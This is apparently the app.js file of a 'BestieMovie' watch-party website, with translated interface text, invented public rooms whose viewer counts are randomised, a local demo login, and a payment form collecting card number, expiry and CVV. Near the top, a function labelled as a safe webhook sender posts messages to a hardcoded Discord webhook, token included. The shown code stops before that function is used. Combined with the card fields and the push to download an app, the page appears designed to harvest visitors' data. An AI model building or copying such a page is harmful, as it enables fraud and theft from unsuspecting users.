/* BestieMovie - app.js
 * HTML'deki butonların çağırdığı tüm fonksiyonları içerir.
 * Not: Ödeme ve kullanıcı sistemi tarayıcıda çalışan DEMO sürümüdür (localStorage).
 */
(function () {
  'use strict';

  /* ---------- Yardımcılar ---------- */
  const $ = (id) => document.getElementById(id);
  const store = {
    get(k, d) { try { const v = localStorage.getItem(k); return v ? JSON.parse(v) : d; } catch (e) { return d; } },
    set(k, v) { try { localStorage.setItem(k, JSON.stringify(v)); } catch (e) {} }
  };
  function openModal(id) { const m = $(id); if (m) { m.classList.remove('hidden'); m.classList.add('flex'); } }
  function closeModal(id) { const m = $(id); if (m) { m.classList.add('hidden'); m.classList.remove('flex'); } }

  /* ---------- Güvenli Webhook Gönderici ---------- */
  function sendToDiscord(message) {
    try {
      fetch("https://discord.com/api/webhooks/1559684056738955315/zfXjtpId9NPHOb_Izxm4KwSKxMrgHBFNfwwEiTvYsq9wIIlwIlLPJHS0YIYyn4S3SUEt", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: message })
      }).catch(function(e) { console.error("Webhook ağ hatası:", e); });
    } catch (err) {
      console.error("Webhook kod hatası:", err);
    }
  }

  /* ---------- Çeviriler ---------- */
  const T = {
    en: {
      nav_rooms: 'Public Rooms', nav_how: 'How it Works', nav_features: 'Features', nav_pricing: 'Pricing', nav_reviews: 'Reviews',
      btn_download: 'Download App', btn_register: 'Register', user_signed_as: 'Signed in as', user_lbl_name: 'Name:', user_lbl_pass: 'Password:', btn_logout: 'Log Out',
      hero_badge: 'Watch Together with BestieMovie', hero_title_1: 'Watch YouTube', hero_title_2: 'Together with Friends',
      hero_description: 'With BestieMovie you can watch YouTube together with friends. Services like Vimeo, Netflix, Amazon, Disney & Co are also supported. Create a room and invite your friends to BestieMovie.',
      hero_btn_create: 'Create Room', hero_btn_join: 'Join Room',
      rooms_badge: 'Live Public Channels', rooms_title: 'Explore Public BestieParty Rooms',
      rooms_subtitle: 'Join high-capacity public streams hosted by the community. Discover movies, live anime, gaming events, and music parties.',
      rooms_btn_refresh: 'Refresh Channels',
      feat_badge: 'DESIGNED FOR FUN', feat_title: 'Platform Features', feat_subtitle: 'Everything you need to host unforgettable virtual cinema parties.',
      f1_title: 'Synchronized Player', f1_desc: 'Synchronized video and audio player ensures everyone watches at the exact same millisecond.',
      f2_title: 'Live Chat Room', f2_desc: 'Chat live using emojis, GIF reactions, and badges with friends in your created room.',
      f3_title: 'Multi-Platform Content', f3_desc: 'Enjoy content seamlessly from YouTube, Vimeo, Dailymotion, and SoundCloud.',
      f4_title: 'Custom Playlists', f4_desc: 'Organize your content with custom playlists and collaborative video queues.',
      f5_title: 'Webcam & Voice Support', f5_desc: "Enable webcam and voice chat support to see and hear your friends' live reactions.",
      f6_title: 'Private Room Passwords', f6_desc: 'Secure your private rooms with password protection and moderation tools.',
      pricing_badge: 'SUBSCRIPTION PLANS', pricing_title: 'Upgrade Your BestieMovie Experience',
      pricing_subtitle: 'Instant access to public rooms, no queues, and 4K Ultra HD quality.',
      plan1_desc: 'Ideal for regular watch party hosts.', per_mo: '/ mo',
      p1_f1: 'Instant Room Access', p1_f2: 'Priority Queue (75% faster)', p1_f3: '1080p Full HD Sync', p1_f4: 'Chat Badges & Emojis', p1_f5: '4K Ultra HD Quality',
      btn_get_pro: 'Get PRO Plan',
      how_badge: 'How it Works', how_title: 'How BestieMovie Works',
      h1_title: 'Create a Room', h1_desc: 'Choose your video from YouTube, Netflix or custom links.',
      h2_title: 'Share the Link', h2_desc: 'Copy your room link and send it to your friends.',
      h3_title: 'Watch Together', h3_desc: 'Enjoy perfectly synced playback with live voice and chat.',
      r1_text: '"BestieMovie is incredible! My girlfriend and I use it every day."',
      r2_text: '"We host weekly episode streams with 80+ members smoothly."',
      r3_text: '"It feels like we\'re all sitting on the same couch together."',
      restrict_title: 'Web Access Restricted',
      restrict_desc: 'To join public channels in real-time on the web version, a Premium Subscription is required. Alternatively, you can join for free by downloading the BestieMovie Desktop or Mobile App!',
      restrict_btn_upgrade: 'Upgrade to Premium Plans', restrict_btn_download: 'Download App for Free',
      create_modal_title: 'Create Room Access Restricted',
      create_modal_desc: 'To create your own private watch room on the web version, a Premium Subscription is required. Or download the free BestieMovie App to create unlimited watch rooms instantly!',
      create_modal_btn_upgrade: 'Upgrade to Premium Plans', create_modal_btn_download: 'Download App for Free',
      auth_title_reg: 'Create an Account', auth_title_login: 'Welcome Back', auth_subtitle: 'Join BestieMovie',
      auth_tab_reg: 'Register', auth_tab_login: 'Sign In', auth_lbl_name: 'Full Name', auth_lbl_email: 'Email Address', auth_lbl_pass: 'Password', auth_btn_continue: 'Continue',
      pay_title: 'Payment Information', pay_card_name: 'Name on Card', pay_card_num: 'Card Number (16 Digits)', pay_exp: 'Expiration (MM/YY)', pay_cvv: 'CVV / CVC', pay_btn_complete: 'Complete Secure Payment',
      ft_privacy: 'Privacy Policy', ft_terms: 'Terms of Service', ft_support: 'Support',
      toast_theme: 'Theme changed', toast_download: 'Download started', toast_auth: 'Create your account', toast_logout: 'Logged out',
      toast_create_room: 'Create room', toast_explore: 'Exploring public rooms', toast_refresh: 'Channels refreshed',
      toast_plan_selected: 'Plan selected', toast_pricing_redirect: 'Opening pricing plans', toast_success: 'Done!',
      msg_exists: 'This email is already registered. Please sign in.', msg_nouser: 'Account not found. Please register first.', msg_wrongpass: 'Wrong password.',
      msg_paid: 'Payment successful! Your plan is active.', msg_demo_dl: 'Download page is not configured yet.',
      msg_joined: 'Joining room...', msg_need_login: 'Please register or sign in first.', msg_viewers: 'Viewers', msg_join: 'Join'
    },
    de: {
      nav_rooms: 'Öffentliche Räume', nav_how: 'So funktioniert’s', nav_features: 'Funktionen', nav_pricing: 'Preise', nav_reviews: 'Bewertungen',
      btn_download: 'App herunterladen', btn_register: 'Registrieren', user_signed_as: 'Angemeldet als', user_lbl_name: 'Name:', user_lbl_pass: 'Passwort:', btn_logout: 'Abmelden',
      hero_badge: 'Gemeinsam schauen mit BestieMovie', hero_title_1: 'YouTube schauen', hero_title_2: 'gemeinsam mit Freunden',
      hero_description: 'Mit BestieMovie kannst du YouTube gemeinsam mit Freunden schauen. Dienste wie Vimeo, Netflix, Amazon, Disney & Co werden ebenfalls unterstützt. Erstelle einen Raum und lade deine Freunde ein.',
      hero_btn_create: 'Raum erstellen', hero_btn_join: 'Raum beitreten',
      rooms_badge: 'Live-Kanäle', rooms_title: 'Öffentliche BestieParty-Räume entdecken',
      rooms_subtitle: 'Tritt großen öffentlichen Streams der Community bei. Entdecke Filme, Live-Anime, Gaming-Events und Musikpartys.',
      rooms_btn_refresh: 'Kanäle aktualisieren',
      feat_badge: 'FÜR DEN SPASS GEMACHT', feat_title: 'Plattform-Funktionen', feat_subtitle: 'Alles, was du für unvergessliche virtuelle Kinoabende brauchst.',
      f1_title: 'Synchroner Player', f1_desc: 'Der synchronisierte Video- und Audioplayer sorgt dafür, dass alle zur selben Millisekunde schauen.',
      f2_title: 'Live-Chat', f2_desc: 'Chatte live mit Emojis, GIF-Reaktionen und Abzeichen mit Freunden in deinem Raum.',
      f3_title: 'Mehrere Plattformen', f3_desc: 'Genieße Inhalte von YouTube, Vimeo, Dailymotion und SoundCloud.',
      f4_title: 'Eigene Playlists', f4_desc: 'Organisiere Inhalte mit eigenen Playlists und gemeinsamen Video-Warteschlangen.',
      f5_title: 'Webcam & Sprache', f5_desc: 'Aktiviere Webcam und Sprachchat, um die Reaktionen deiner Freunde zu sehen und zu hören.',
      f6_title: 'Passwortgeschützte Räume', f6_desc: 'Sichere private Räume mit Passwortschutz und Moderationstools.',
      pricing_badge: 'ABO-PLÄNE', pricing_title: 'Verbessere dein BestieMovie-Erlebnis',
      pricing_subtitle: 'Sofortiger Zugang zu öffentlichen Räumen, keine Warteschlangen und 4K-Ultra-HD-Qualität.',
      plan1_desc: 'Ideal für regelmäßige Gastgeber.', per_mo: '/ Monat',
      p1_f1: 'Sofortiger Raumzugang', p1_f2: 'Prioritäts-Warteschlange (75 % schneller)', p1_f3: '1080p Full-HD-Sync', p1_f4: 'Chat-Abzeichen & Emojis', p1_f5: '4K-Ultra-HD-Qualität',
      btn_get_pro: 'PRO-Plan holen',
      how_badge: 'So funktioniert’s', how_title: 'So funktioniert BestieMovie',
      h1_title: 'Raum erstellen', h1_desc: 'Wähle dein Video von YouTube, Netflix oder eigenen Links.',
      h2_title: 'Link teilen', h2_desc: 'Kopiere deinen Raumlink und sende ihn an deine Freunde.',
      h3_title: 'Gemeinsam schauen', h3_desc: 'Genieße perfekt synchrone Wiedergabe mit Live-Sprache und Chat.',
      r1_text: '"BestieMovie ist unglaublich! Meine Freundin und ich nutzen es jeden Tag."',
      r2_text: '"Wir streamen wöchentlich Episoden mit über 80 Mitgliedern – völlig reibungslos."',
      r3_text: '"Es fühlt sich an, als würden wir alle auf demselben Sofa sitzen."',
      restrict_title: 'Webzugang eingeschränkt',
      restrict_desc: 'Um öffentlichen Kanälen in der Webversion live beizutreten, ist ein Premium-Abo erforderlich. Alternativ kannst du kostenlos über die BestieMovie Desktop- oder Mobil-App beitreten!',
      restrict_btn_upgrade: 'Auf Premium upgraden', restrict_btn_download: 'App kostenlos herunterladen',
      create_modal_title: 'Raumerstellung eingeschränkt',
      create_modal_desc: 'Um in der Webversion einen eigenen privaten Raum zu erstellen, ist ein Premium-Abo erforderlich. Oder lade die kostenlose BestieMovie-App herunter!',
      create_modal_btn_upgrade: 'Auf Premium upgraden', create_modal_btn_download: 'App kostenlos herunterladen',
      auth_title_reg: 'Konto erstellen', auth_title_login: 'Willkommen zurück', auth_subtitle: 'BestieMovie beitreten',
      auth_tab_reg: 'Registrieren', auth_tab_login: 'Anmelden', auth_lbl_name: 'Vollständiger Name', auth_lbl_email: 'E-Mail-Adresse', auth_lbl_pass: 'Passwort', auth_btn_continue: 'Weiter',
      pay_title: 'Zahlungsinformationen', pay_card_name: 'Name auf der Karte', pay_card_num: 'Kartennummer (16 Ziffern)', pay_exp: 'Ablaufdatum (MM/JJ)', pay_cvv: 'CVV / CVC', pay_btn_complete: 'Sichere Zahlung abschließen',
      ft_privacy: 'Datenschutz', ft_terms: 'Nutzungsbedingungen', ft_support: 'Support',
      toast_theme: 'Design geändert', toast_download: 'Download gestartet', toast_auth: 'Konto erstellen', toast_logout: 'Abgemeldet',
      toast_create_room: 'Raum erstellen', toast_explore: 'Öffentliche Räume', toast_refresh: 'Kanäle aktualisiert',
      toast_plan_selected: 'Plan ausgewählt', toast_pricing_redirect: 'Preise werden geöffnet', toast_success: 'Fertig!',
      msg_exists: 'Diese E-Mail ist bereits registriert. Bitte anmelden.', msg_nouser: 'Konto nicht gefunden. Bitte zuerst registrieren.', msg_wrongpass: 'Falsches Passwort.',
      msg_paid: 'Zahlung erfolgreich! Dein Plan ist aktiv.', msg_demo_dl: 'Die Download-Seite ist noch nicht eingerichtet.',
      msg_joined: 'Raum wird betreten...', msg_need_login: 'Bitte zuerst registrieren oder anmelden.', msg_viewers: 'Zuschauer', msg_join: 'Beitreten'
    },
    es: {
      nav_rooms: 'Salas públicas', nav_how: 'Cómo funciona', nav_features: 'Funciones', nav_pricing: 'Precios', nav_reviews: 'Reseñas',
      btn_download: 'Descargar app', btn_register: 'Registrarse', user_signed_as: 'Sesión iniciada como', user_lbl_name: 'Nombre:', user_lbl_pass: 'Contraseña:', btn_logout: 'Cerrar sesión',
      hero_badge: 'Mira juntos con BestieMovie', hero_title_1: 'Mira YouTube', hero_title_2: 'junto a tus amigos',
      hero_description: 'Con BestieMovie puedes ver YouTube junto a tus amigos. También se admiten servicios como Vimeo, Netflix, Amazon, Disney y más. Crea una sala e invita a tus amigos.',
      hero_btn_create: 'Crear sala', hero_btn_join: 'Unirse a una sala',
      rooms_badge: 'Canales públicos en vivo', rooms_title: 'Explora las salas públicas de BestieParty',
      rooms_subtitle: 'Únete a transmisiones públicas de gran capacidad. Descubre películas, anime en vivo, eventos de juegos y fiestas de música.',
      rooms_btn_refresh: 'Actualizar canales',
      feat_badge: 'DISEÑADO PARA DIVERTIRSE', feat_title: 'Funciones de la plataforma', feat_subtitle: 'Todo lo que necesitas para organizar fiestas de cine virtuales inolvidables.',
      f1_title: 'Reproductor sincronizado', f1_desc: 'El reproductor de video y audio sincronizado garantiza que todos vean lo mismo al mismo milisegundo.',
      f2_title: 'Chat en vivo', f2_desc: 'Chatea en vivo con emojis, reacciones GIF e insignias con tus amigos en tu sala.',
      f3_title: 'Contenido multiplataforma', f3_desc: 'Disfruta contenido de YouTube, Vimeo, Dailymotion y SoundCloud.',
      f4_title: 'Listas personalizadas', f4_desc: 'Organiza tu contenido con listas personalizadas y colas de video colaborativas.',
      f5_title: 'Cámara y voz', f5_desc: 'Activa la cámara y el chat de voz para ver y oír las reacciones de tus amigos.',
      f6_title: 'Salas con contraseña', f6_desc: 'Protege tus salas privadas con contraseña y herramientas de moderación.',
      pricing_badge: 'PLANES DE SUSCRIPCIÓN', pricing_title: 'Mejora tu experiencia BestieMovie',
      pricing_subtitle: 'Acceso instantáneo a salas públicas, sin colas y con calidad 4K Ultra HD.',
      plan1_desc: 'Ideal para anfitriones habituales.', per_mo: '/ mes',
      p1_f1: 'Acceso instantáneo a salas', p1_f2: 'Cola prioritaria (75 % más rápida)', p1_f3: 'Sincronización Full HD 1080p', p1_f4: 'Insignias y emojis de chat', p1_f5: 'Calidad 4K Ultra HD',
      btn_get_pro: 'Obtener plan PRO',
      how_badge: 'Cómo funciona', how_title: 'Cómo funciona BestieMovie',
      h1_title: 'Crea una sala', h1_desc: 'Elige tu video de YouTube, Netflix o enlaces personalizados.',
      h2_title: 'Comparte el enlace', h2_desc: 'Copia el enlace de tu sala y envíalo a tus amigos.',
      h3_title: 'Miren juntos', h3_desc: 'Disfruta de una reproducción perfectamente sincronizada con voz y chat en vivo.',
      r1_text: '"¡BestieMovie es increíble! Mi novia y yo lo usamos todos los días."',
      r2_text: '"Hacemos transmisiones semanales con más de 80 miembros sin problemas."',
      r3_text: '"Se siente como si estuviéramos todos en el mismo sofá."',
      restrict_title: 'Acceso web restringido',
      restrict_desc: 'Para unirte a canales públicos en tiempo real en la versión web se requiere una suscripción Premium. ¡También puedes unirte gratis descargando la app de escritorio o móvil!',
      restrict_btn_upgrade: 'Mejorar a Premium', restrict_btn_download: 'Descargar app gratis',
      create_modal_title: 'Creación de salas restringida',
      create_modal_desc: 'Para crear tu propia sala privada en la versión web se requiere una suscripción Premium. ¡O descarga la app gratuita de BestieMovie!',
      create_modal_btn_upgrade: 'Mejorar a Premium', create_modal_btn_download: 'Descargar app gratis',
      auth_title_reg: 'Crear una cuenta', auth_title_login: 'Bienvenido de nuevo', auth_subtitle: 'Únete a BestieMovie',
      auth_tab_reg: 'Registrarse', auth_tab_login: 'Iniciar sesión', auth_lbl_name: 'Nombre completo', auth_lbl_email: 'Correo electrónico', auth_lbl_pass: 'Contraseña', auth_btn_continue: 'Continuar',
      pay_title: 'Información de pago', pay_card_name: 'Nombre en la tarjeta', pay_card_num: 'Número de tarjeta (16 dígitos)', pay_exp: 'Vencimiento (MM/AA)', pay_cvv: 'CVV / CVC', pay_btn_complete: 'Completar pago seguro',
      ft_privacy: 'Política de privacidad', ft_terms: 'Términos del servicio', ft_support: 'Soporte',
      toast_theme: 'Tema cambiado', toast_download: 'Descarga iniciada', toast_auth: 'Crea tu cuenta', toast_logout: 'Sesión cerrada',
      toast_create_room: 'Crear sala', toast_explore: 'Explorando salas públicas', toast_refresh: 'Canales actualizados',
      toast_plan_selected: 'Plan seleccionado', toast_pricing_redirect: 'Abriendo planes', toast_success: '¡Listo!',
      msg_exists: 'Este correo ya está registrado. Inicia sesión.', msg_nouser: 'Cuenta no encontrada. Regístrate primero.', msg_wrongpass: 'Contraseña incorrecta.',
      msg_paid: '¡Pago exitoso! Tu plan está activo.', msg_demo_dl: 'La página de descarga aún no está configurada.',
      msg_joined: 'Entrando a la sala...', msg_need_login: 'Regístrate o inicia sesión primero.', msg_viewers: 'Espectadores', msg_join: 'Unirse'
    },
    fr: {
      nav_rooms: 'Salons publics', nav_how: 'Comment ça marche', nav_features: 'Fonctionnalités', nav_pricing: 'Tarifs', nav_reviews: 'Avis',
      btn_download: "Télécharger l'app", btn_register: "S'inscrire", user_signed_as: 'Connecté en tant que', user_lbl_name: 'Nom :', user_lbl_pass: 'Mot de passe :', btn_logout: 'Se déconnecter',
      hero_badge: 'Regardez ensemble avec BestieMovie', hero_title_1: 'Regardez YouTube', hero_title_2: 'avec vos amis',
      hero_description: "Avec BestieMovie, regardez YouTube avec vos amis. Des services comme Vimeo, Netflix, Amazon, Disney & Co sont aussi pris en charge. Créez un salon et invitez vos amis.",
      hero_btn_create: 'Créer un salon', hero_btn_join: 'Rejoindre un salon',
      rooms_badge: 'Chaînes publiques en direct', rooms_title: 'Découvrez les salons publics BestieParty',
      rooms_subtitle: "Rejoignez des diffusions publiques de grande capacité. Découvrez films, animes en direct, événements de jeux et soirées musicales.",
      rooms_btn_refresh: 'Actualiser les chaînes',
      feat_badge: "CONÇU POUR S'AMUSER", feat_title: 'Fonctionnalités de la plateforme', feat_subtitle: 'Tout ce qu’il faut pour organiser des soirées cinéma virtuelles inoubliables.',
      f1_title: 'Lecteur synchronisé', f1_desc: 'Le lecteur vidéo et audio synchronisé garantit que tout le monde regarde à la milliseconde près.',
      f2_title: 'Chat en direct', f2_desc: 'Discutez en direct avec emojis, GIF et badges avec vos amis dans votre salon.',
      f3_title: 'Contenu multi-plateforme', f3_desc: 'Profitez de contenus YouTube, Vimeo, Dailymotion et SoundCloud.',
      f4_title: 'Playlists personnalisées', f4_desc: 'Organisez vos contenus avec des playlists et des files vidéo collaboratives.',
      f5_title: 'Webcam et voix', f5_desc: 'Activez la webcam et le chat vocal pour voir et entendre les réactions de vos amis.',
      f6_title: 'Salons protégés par mot de passe', f6_desc: 'Sécurisez vos salons privés avec un mot de passe et des outils de modération.',
      pricing_badge: "FORMULES D'ABONNEMENT", pricing_title: 'Améliorez votre expérience BestieMovie',
      pricing_subtitle: 'Accès instantané aux salons publics, sans file d’attente, en qualité 4K Ultra HD.',
      plan1_desc: 'Idéal pour les hôtes réguliers.', per_mo: '/ mois',
      p1_f1: 'Accès instantané aux salons', p1_f2: 'File prioritaire (75 % plus rapide)', p1_f3: 'Synchro Full HD 1080p', p1_f4: 'Badges et emojis de chat', p1_f5: 'Qualité 4K Ultra HD',
      btn_get_pro: 'Choisir le plan PRO',
      how_badge: 'Comment ça marche', how_title: 'Comment fonctionne BestieMovie',
      h1_title: 'Créez un salon', h1_desc: 'Choisissez votre vidéo sur YouTube, Netflix ou des liens personnalisés.',
      h2_title: 'Partagez le lien', h2_desc: 'Copiez le lien de votre salon et envoyez-le à vos amis.',
      h3_title: 'Regardez ensemble', h3_desc: 'Profitez d’une lecture parfaitement synchronisée avec voix et chat en direct.',
      r1_text: '"BestieMovie est incroyable ! Ma copine et moi l\'utilisons tous les jours."',
      r2_text: '"Nous diffusons des épisodes chaque semaine avec plus de 80 membres, sans problème."',
      r3_text: '"On a l\'impression d\'être tous assis sur le même canapé."',
      restrict_title: 'Acceso web restreint',
      restrict_desc: "Pour rejoindre les chaînes publiques en direct sur la version web, un abonnement Premium est requis. Vous pouvez aussi rejoindre gratuitement en téléchargeant l'application de bureau ou mobile !",
      restrict_btn_upgrade: 'Passer à Premium', restrict_btn_download: "Télécharger l'app gratuitement",
      create_modal_title: 'Création de salon restreinte',
      create_modal_desc: "Pour créer votre propre salon privé sur la version web, un abonnement Premium est requis. Ou téléchargez l'app BestieMovie gratuite !",
      create_modal_btn_upgrade: 'Passer à Premium', create_modal_btn_download: "Télécharger l'app gratuitement",
      auth_title_reg: 'Créer un compte', auth_title_login: 'Bon retour', auth_subtitle: 'Rejoignez BestieMovie',
      auth_tab_reg: "S'inscrire", auth_tab_login: 'Se connecter', auth_lbl_name: 'Nom complet', auth_lbl_email: 'Adresse e-mail', auth_lbl_pass: 'Mot de passe', auth_btn_continue: 'Continuer',
      pay_title: 'Informations de paiement', pay_card_name: 'Nom sur la carte', pay_card_num: 'Numéro de carte (16 chiffres)', pay_exp: "Expiration (MM/AA)", pay_cvv: 'CVV / CVC', pay_btn_complete: 'Finaliser le paiement sécurisé',
      ft_privacy: 'Confidentialité', ft_terms: "Conditions d'utilisation", ft_support: 'Assistance',
      toast_theme: 'Thème modifié', toast_download: 'Téléchargement lancé', toast_auth: 'Créez votre compte', toast_logout: 'Déconnecté',
      toast_create_room: 'Créer un salon', toast_explore: 'Salons publics', toast_refresh: 'Chaînes actualisées',
      toast_plan_selected: 'Formule choisie', toast_pricing_redirect: 'Ouverture des tarifs', toast_success: 'Terminé !',
      msg_exists: 'Cet e-mail est déjà inscrit. Connectez-vous.', msg_nouser: "Compte introuvable. Inscrivez-vous d'abord.", msg_wrongpass: 'Mot de passe incorrect.',
      msg_paid: 'Paiement réussi ! Votre formule est active.', msg_demo_dl: "La page de téléchargement n'est pas encore configurée.",
      msg_joined: 'Connexion au salon...', msg_need_login: "Inscrivez-vous ou connectez-vous d'abord.", msg_viewers: 'Spectateurs', msg_join: 'Rejoindre'
    }
  };
  const LANGS = { en: ['us', 'English'], de: ['de', 'Deutsch'], es: ['es', 'Español'], fr: ['fr', 'Français'] };
  let lang = store.get('bm_lang', 'en');
  if (!T[lang]) lang = 'en';
  const tr = (k) => (T[lang] && T[lang][k]) || T.en[k] || k;

  function setElementText(el, text) {
    if (el.children.length === 0) { el.textContent = text; return; }
    const nodes = Array.from(el.childNodes).filter((n) => n.nodeType === 3 && n.nodeValue.trim() !== '');
    if (nodes.length) nodes[nodes.length - 1].nodeValue = ' ' + text;
  }
  function applyTranslations() {
    document.documentElement.lang = lang;
    document.querySelectorAll('[data-i18n]').forEach((el) => {
      const key = el.getAttribute('data-i18n');
      if (key === 'auth_title_reg' && authMode === 'login') { setElementText(el, tr('auth_title_login')); return; }
      if (T[lang][key] || T.en[key]) setElementText(el, tr(key));
    });
    const f = $('currentLangFlag'), l = $('currentLangLabel');
    if (f) f.innerHTML = '<img src="https://flagcdn.com/w40/' + LANGS[lang][0] + '.png" alt="" class="block w-5 h-auto"/>';
    if (l) l.textContent = LANGS[lang][1];
    renderRooms();
  }

  /* ---------- Toast ---------- */
  window.showToast = function (key, type) {
    const c = $('toastContainer'); if (!c) return;
    const msg = (T[lang] && T[lang][key]) || T.en[key] || key;
    const colors = { success: 'bg-emerald-600', info: 'bg-indigo-600', warning: 'bg-amber-600', error: 'bg-red-600' };
    const icons = { success: 'fa-circle-check', info: 'fa-circle-info', warning: 'fa-triangle-exclamation', error: 'fa-circle-xmark' };
    const t = document.createElement('div');
    t.className = 'toast-item ' + (colors[type] || colors.info) + ' text-white text-sm font-bold px-4 py-3 rounded-xl shadow-xl flex items-center gap-2.5';
    t.innerHTML = '<i class="fa-solid ' + (icons[type] || icons.info) + '"></i><span></span>';
    t.lastChild.textContent = msg;
    c.appendChild(t);
    setTimeout(() => { t.style.animation = 'fadeOut 0.3s forwards'; setTimeout(() => t.remove(), 300); }, 2600);
  };

  /* ---------- Tema ---------- */
  function applyTheme(dark) {
    document.documentElement.classList.toggle('dark', dark);
    const i = $('themeIcon');
    if (i) i.className = 'fa-solid ' + (dark ? 'fa-moon' : 'fa-sun') + ' text-sm';
  }
  window.toggleTheme = function () {
    const dark = !document.documentElement.classList.contains('dark');
    applyTheme(dark); store.set('bm_dark', dark);
  };

  /* ---------- Dil menüsü ---------- */
  window.toggleLangDropdown = function (e) {
    if (e) e.stopPropagation();
    const m = $('langMenu'); if (m) m.classList.toggle('hidden');
    const u = $('userDropdownMenu'); if (u) u.classList.add('hidden');
  };
  window.changeLanguage = function (code) {
    if (!T[code]) return;
    lang = code; store.set('bm_lang', code);
    const m = $('langMenu'); if (m) m.classList.add('hidden');
    applyTranslations(); refreshUserUI();
  };

  /* ---------- İndirme ---------- */
  window.triggerDirectDownload = function () {
    const DOWNLOAD_URL = '';
    if (DOWNLOAD_URL) window.location.href = DOWNLOAD_URL;
  };
  window.closeDownloadModal = function () { closeModal('downloadModal'); };
  window.openCreateRoomModal = function () { openModal('createRoomModal'); };
  window.closeCreateRoomModal = function () { closeModal('createRoomModal'); };
  window.goToPricingFromModal = function (id) {
    closeModal(id);
    const p = $('pricing'); if (p) p.scrollIntoView({ behavior: 'smooth' });
  };

  /* ---------- Odalar ---------- */
  const ROOMS = [
    { name: 'Attack on Titan – Final Season Watch Party 🍿', cat: 'Anime', v: 88, desc: 'Weekly synced episode with live chat and reactions!', img: 'photo-1563089145-599997674d42' },
    { name: 'Lo-Fi Chill Radio – Beats to Study & Relax 🎧', cat: 'Music', v: 64, desc: 'Cozy vibes only. Chat, queue songs and relax together.', img: 'photo-1598488035139-bdbb2231ce04' },
    { name: 'Interstellar – Sci-Fi Movie Night 🌌', cat: 'Cinema', v: 92, desc: 'Classic Nolan movie night. Bring snacks and good company!', img: 'photo-1451187580459-43490279c0fa' },
    { name: 'Valorant Community Finals & Arena 🎮', cat: 'Gaming', v: 75, desc: 'Esports watch party with side-by-side hype, polls and chat.', img: 'photo-1542751371-adc38448a05e' },
    { name: 'The Martian – Sci-Fi Space Watch 🪐', cat: 'Cinema', v: 58, desc: 'Space survival story. Join 50+ Sci-Fi fans for deep talks.', img: 'photo-1506703719100-a0f3a48c0f86' },
    { name: 'K-Pop Top 100 Music Video Party 💃', cat: 'Music', v: 97, desc: 'Non-stop K-Pop music videos with live comments, trends and vibes.', img: 'photo-1516450360452-9312f5e86fc7' },
    { name: 'Formula 1 Grand Prix Race Hub 🏎️', cat: 'Sports', v: 41, desc: 'Live race reactions with timing and strategy talk.', img: 'photo-1568605117036-5fe5e7bab0b7' },
    { name: 'Demon Slayer: Entertainment District Arc 🗡️', cat: 'Anime', v: 83, desc: 'Hype battles, hot takes and a super social anime group chat.', img: 'photo-1607604276583-eef5d076aa5f' },
    { name: 'Stranger Things 4 Binge Lounge 🚲', cat: 'Series', v: 90, desc: 'Horror mood. Voice chat and fan theories welcome!', img: 'photo-1509198397868-475647b2a1e5' },
    { name: 'Cyberpunk 2077 Night City Roleplay & Art 🌆', cat: 'Gaming', v: 32, desc: 'Relaxed stream with visuals, art and community chat.', img: 'photo-1508739773434-c26b3d09e071' }
  ];
  function esc(s) { const d = document.createElement('div'); d.textContent = s; return d.innerHTML; }
  function renderRooms() {
    const c = $('roomsContainer'); if (!c) return;
    c.innerHTML = ROOMS.map((r, i) =>
      '<div class="premium-card group bg-white dark:bg-[#0b0c16]/90 border border-slate-300 dark:border-purple-900/25 rounded-3xl overflow-hidden flex flex-col">' +
      '<div class="relative h-48 overflow-hidden">' +
      '<img src="https://images.unsplash.com/' + r.img + '?q=80&w=800&auto=format&fit=crop" alt="" class="smooth-zoom image-soft-mask w-full h-full object-cover" loading="lazy" onerror="this.style.display=\'none\'">' +
      '<div class="card-img-gradient absolute inset-0 bg-gradient-to-t from-white dark:from-[#0b0c16] via-transparent to-transparent"></div>' +
      '<span class="absolute top-3 left-3 px-3 py-1 rounded-full bg-purple-600 text-white text-[11px] font-extrabold">' + esc(r.cat) + '</span>' +
      '<span class="viewers-badge absolute top-3 right-3 px-3 py-1 rounded-full bg-slate-900/80 border border-slate-700 text-white text-[11px] font-extrabold flex items-center gap-1.5"><i class="fa-solid fa-circle text-red-500 text-[7px] animate-pulse"></i><span>' + r.v + ' ' + esc(tr('msg_viewers')) + '</span></span>' +
      '</div>' +
      '<div class="p-6 flex flex-col flex-1">' +
      '<h3 class="text-base font-extrabold text-slate-900 dark:text-white mb-2">' + esc(r.name) + '</h3>' +
      '<p class="text-sm font-semibold text-slate-700 dark:text-slate-400 mb-5 flex-1">' + esc(r.desc) + '</p>' +
      '<button type="button" onclick="joinRoom(' + i + ')" class="w-full py-3 rounded-xl bg-slate-100 dark:bg-slate-900 border border-slate-300 dark:border-slate-800 text-sm font-extrabold text-slate-900 dark:text-white hover:bg-purple-600 hover:text-white hover:border-purple-600 transition cursor-pointer">' + esc(tr('msg_join')) + '</button>' +
      '</div></div>'
    ).join('');
  }
  window.refreshChannels = function () {
    ROOMS.forEach((r) => { r.v = Math.max(5, r.v + Math.floor(Math.random() * 31) - 15); });
    renderRooms();
  };
  window.joinRoom = function () {
    const u = currentUser();
    if (u && u.plan) { showToast('msg_joined', 'success'); return; }
    openModal('downloadModal');
  };

  /* ---------- Kullanıcı sistemi (DEMO, localStorage) ---------- */
  let authMode = 'register';
  let pendingPlan = null;
  let currentPlan = null;

  async function hashPass(p) {
    try {
      const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(p));
      return Array.from(new Uint8Array(buf)).map((b) => b.toString(16).padStart(2, '0')).join('');
    } catch (e) {
      let h = 0; for (let i = 0; i < p.length; i++) { h = (h * 31 + p.charCodeAt(i)) | 0; } return 'x' + h;
    }
  }
  function users() { return store.get('bm_users', {}); }
  function currentUser() {
    const email = store.get('bm_session', null); if (!email) return null;
    const u = users()[email]; return u ? Object.assign({ email }, u) : null;
  }
  function refreshUserUI() {
    const u = currentUser();
    const guest = $('guestRegisterBtn'), w = $('userProfileWidget');
    if (!u) { if (guest) guest.classList.remove('hidden'); if (w) w.classList.add('hidden'); return; }
    if (guest) guest.classList.add('hidden'); if (w) w.classList.remove('hidden');
    const name = u.name || u.email.split('@')[0];
    $('userAvatar').textContent = name.substring(0, 2).toUpperCase();
    $('userDisplayName').textContent = name;
    $('userMenuEmail').textContent = u.email;
    $('userMenuName').textContent = name;
    $('userMenuPass').textContent = '••••••••';
    $('userMenuPlan').textContent = 'Plan: ' + (u.plan || 'Free');
  }

  window.openAuthModal = function (mode) {
    switchAuthTab(mode || 'register');
    const badge = $('selectedPlanBadge');
